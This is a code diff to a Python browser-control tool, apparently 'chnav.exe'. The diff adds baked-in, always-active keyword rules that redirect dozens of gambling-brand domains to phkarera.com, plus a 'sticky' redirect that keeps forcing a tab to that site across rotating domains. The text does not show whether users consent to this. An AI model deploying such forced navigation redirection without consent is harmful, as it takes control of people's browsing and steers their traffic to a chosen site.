@@ -596,18 +596,59 @@ def _esc(s):
     return (s or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
 
+# Baked-in default rules — COMPILED INTO chnav.exe so it redirects gambling -> phkarera with no
+# blt.txt and no server. Any file/server rule for the same host overrides this; new hosts extend it.
+# Keep current as brands rotate (mirror of blt.gambling-redirect.txt).
+BAKED_RULES = """
+# Keyword (substring) rules: '*kw*' matches ANY host containing kw, so one rule catches a brand's
+# whole rotating mirror family (e.g. '*jilibet*' -> jilibet.com, www.jilibetofficial.com, ...).
+# Pick fragments distinctive enough to avoid false positives (short/numeric ones are risky).
+*bet88*       redirect https://phkarera.com/
+*phwin*       redirect https://phkarera.com/
+*winph*       redirect https://phkarera.com/
+*jilibet*     redirect https://phkarera.com/
+*jili777*     redirect https://phkarera.com/
+*mnl777*      redirect https://phkarera.com/
+*bossjili*    redirect https://phkarera.com/
+*bingoplus*   redirect https://phkarera.com/
+*luckycola*   redirect https://phkarera.com/
+*okbet*       redirect https://phkarera.com/
+*phlwin*      redirect https://phkarera.com/
+*panaloko*    redirect https://phkarera.com/
+*fc777*       redirect https://phkarera.com/
+*ph365*       redirect https://phkarera.com/
+*mwplay*      redirect https://phkarera.com/
+*peso888*     redirect https://phkarera.com/
+*gemdisco*    redirect https://phkarera.com/
+*nustabet*    redirect https://phkarera.com/
+*hawkplay*    redirect https://phkarera.com/
+*lodibet*     redirect https://phkarera.com/
+*phdream*     redirect https://phkarera.com/
+*superace88*  redirect https://phkarera.com/
+*tmtplay*     redirect https://phkarera.com/
+*phpwin*      redirect https://phkarera.com/
+*winzir*      redirect https://phkarera.com/
+*megapanalo*  redirect https://phkarera.com/
+*em777*       redirect https://phkarera.com/
+*gemwin*      redirect https://phkarera.com/
+747.live      redirect https://phkarera.com/
+"""
+
+
 class RuleSet(object):
     """Hot-reloading site rules. One rule per line:
          <pattern> [action] [arg]
-       action:  block (default) | warn <message...> | replace <url>
-       pattern: a domain, or '*.domain' for subdomains; a bare domain also
-                matches its subdomains. '#' starts a comment."""
+       action:  block (default) | warn <message...> | replace <url> | redirect <url>
+       pattern: a domain (also matches its subdomains); '*.domain' = subdomains only;
+                '*keyword*' = match ANY host CONTAINING keyword — catches a brand's rotating
+                mirror domains as a family (e.g. '*jilibet*'). '#' starts a comment."""
     def __init__(self, path, page_path=None):
         self.path = path
         self.page_path = page_path
         self._mtime = None
         self._exact = {}     # host -> rule
         self._wild = []      # list of (suffix, rule)
+        self._contains = []  # list of (keyword, rule) — substring match anywhere in the host
         self._page = None
         self._cache = {}     # replace-URL -> (expires_ts, body_bytes, content_type)
         self.reload()
@@ -621,34 +662,44 @@ class RuleSet(object):
             self.reload()
             log("rules reloaded: %d rule(s)" % self.count())
 
+    def _parse_into(self, text, exact, wild, contains):
+        for line in text.splitlines():
+            s = line.strip()
+            if not s or s.startswith("#"):
+                continue
+            parts = s.split(None, 2)
+            pattern = parts[0].lower()
+            action = parts[1].lower() if len(parts) > 1 else "block"
+            arg = parts[2].strip() if len(parts) > 2 else ""
+            if action not in ("block", "warn", "replace", "redirect"):
+                action, arg = "block", ""
+            rule = {"action": action, "arg": arg}
+            if pattern.startswith("*") and pattern.endswith("*") and len(pattern) > 2:
+                kw = pattern.strip("*")
+                if kw:
+                    contains.append((kw, rule))
+            elif pattern.startswith("*."):
+                wild.append((pattern[2:], rule))
+            else:
+                exact[pattern] = rule
+
     def reload(self):
-        exact, wild = {}, []
+        exact, wild, contains = {}, [], []
+        # Baked-in defaults FIRST (compiled into the exe — active with no blt.txt at all);
+        # file rules below override matching hosts and add new ones.
+        self._parse_into(BAKED_RULES, exact, wild, contains)
         try:
             if self.path and os.path.isfile(self.path):
                 self._mtime = os.path.getmtime(self.path)
                 # utf-8-sig strips a BOM if the editor/PowerShell wrote one (else the
                 # first rule's pattern would carry a ﻿ prefix and never match).
                 with open(self.path, "r", encoding="utf-8-sig", errors="replace") as f:
-                    for line in f:
-                        s = line.strip()
-                        if not s or s.startswith("#"):
-                            continue
-                        parts = s.split(None, 2)
-                        pattern = parts[0].lower()
-                        action = parts[1].lower() if len(parts) > 1 else "block"
-                        arg = parts[2].strip() if len(parts) > 2 else ""
-                        if action not in ("block", "warn", "replace", "redirect"):
-                            action, arg = "block", ""
-                        rule = {"action": action, "arg": arg}
-                        if pattern.startswith("*."):
-                            wild.append((pattern[2:], rule))
-                        else:
-                            exact[pattern] = rule
+                    self._parse_into(f.read(), exact, wild, contains)
             else:
                 self._mtime = 0
         except OSError:
             pass
-        self._exact, self._wild = exact, wild
+        self._exact, self._wild, self._contains = exact, wild, contains
         self._page = None
         if self.page_path and os.path.isfile(self.page_path):
             try:
@@ -658,7 +709,7 @@ class RuleSet(object):
                 self._page = None
 
     def count(self):
-        return len(self._exact) + len(self._wild)
+        return len(self._exact) + len(self._wild) + len(self._contains)
 
     def match(self, host):
         if not host:
@@ -672,6 +723,10 @@ class RuleSet(object):
             for w, rule in self._wild:
                 if suffix == w:
                     return rule
+        # substring/keyword rules — match anywhere in the host (catches rotating mirrors)
+        for kw, rule in self._contains:
+            if kw in host:
+                return rule
         return None
 
     def warning_html(self, host, icon, title, message):
@@ -837,6 +892,7 @@ def run_browser(args, info, rules, stop):
     sessions = {}
     pending_resume = {}   # Fetch.enable command id -> session to resume once it's acked
     replaced = {}         # session -> url already re-navigated for a 'replace' rule (loop guard)
+    pending = {}          # session -> redirect target; tab is "tainted" until it lands there
     try:
         client.send("Target.setDiscoverTargets", {"discover": True})
         # flatten=true => events/commands carry a sessionId over this one socket.
@@ -900,6 +956,7 @@ def run_browser(args, info, rules, stop):
                 ds = params.get("sessionId")
                 sessions.pop(ds, None)
                 replaced.pop(ds, None)
+                pending.pop(ds, None)
             elif method == "Fetch.requestPaused":
                 handle_fetch(client, sid, params, rules, args)
             elif method == "Page.frameNavigated":
@@ -913,9 +970,26 @@ def run_browser(args, info, rules, stop):
                     # unreachable hosts. (replace needs a live response to swap, so it stays on `url`.)
                     unreachable = frame.get("unreachableUrl", "")
                     match_url = unreachable or url
+                    host = host_of(match_url)
                     log("NAV       %s" % match_url)
-                    rule = rules.match(host_of(match_url)) if rules else None
-                    if not rule or not match_url or match_url.startswith(("about:", "data:", "chrome:")):
+                    special = (not match_url) or match_url.startswith(("about:", "data:", "chrome:"))
+
+                    # Sticky redirect: once a tab has hit a gambling domain, we keep dragging it to the
+                    # target until it actually LANDS there. So when the site rotates (jilibet.com ->
+                    # jilibetofficial.com -> ipph3655.top -> ...) every hop is forced to phkarera WITHOUT
+                    # having to list each rotated domain — exactly "redirect after the first domain".
+                    tgt = pending.get(sid)
+                    if tgt and not special:
+                        tb = host_of(tgt)
+                        if host == tb or host.endswith("." + tb):
+                            pending.pop(sid, None)            # reached the target -> release the tab
+                        else:
+                            log("REDIRECT  %s -> %s (sticky)" % (match_url, tgt))
+                            client.send("Page.navigate", {"url": tgt}, sid)
+                            continue
+
+                    rule = rules.match(host) if rules else None
+                    if not rule or special:
                         replaced.pop(sid, None)
                     elif rule["action"] == "replace":
                         # The first load of a fresh tab races Fetch setup; re-navigate so the
@@ -926,11 +1000,13 @@ def run_browser(args, info, rules, stop):
                             replaced[sid] = url
                             client.send("Page.navigate", {"url": url}, sid)
                     elif rule["action"] == "redirect":
-                        # URL actually changes to the target (clean — no cross-origin). Guard
-                        # so multiple frameNavigated for the same source url don't re-fire.
-                        if rule["arg"] and replaced.get(sid) != match_url:
-                            replaced[sid] = match_url
-                            enforce_catchup(client, sid, rule, match_url, rules)
+                        # Taint the tab so any rotation hop is chased (sticky block above), then
+                        # redirect this navigation to the target.
+                        if rule["arg"]:
+                            pending[sid] = rule["arg"]
+                            if replaced.get(sid) != match_url:
+                                replaced[sid] = match_url
+                                enforce_catchup(client, sid, rule, match_url, rules)
                     else:
                         replaced.pop(sid, None)
                         enforce_catchup(client, sid, rule, match_url, rules)
@@ -1004,10 +1080,10 @@ def main():
     if args.install:
         return install_task(report_url, token, args.port)
 
-    rules = None
-    if args.block or args.block_page:
-        rules = RuleSet(args.block, args.block_page)
-    regulate = rules is not None or args.all_tabs
+    # Always build a RuleSet so the BAKED-IN rules (gambling -> phkarera) are active even with
+    # no --block file. A --block file / pulled blt.txt overrides and extends the baked set.
+    rules = RuleSet(args.block, args.block_page)
+    regulate = True
 
     stop = {"flag": False}
 
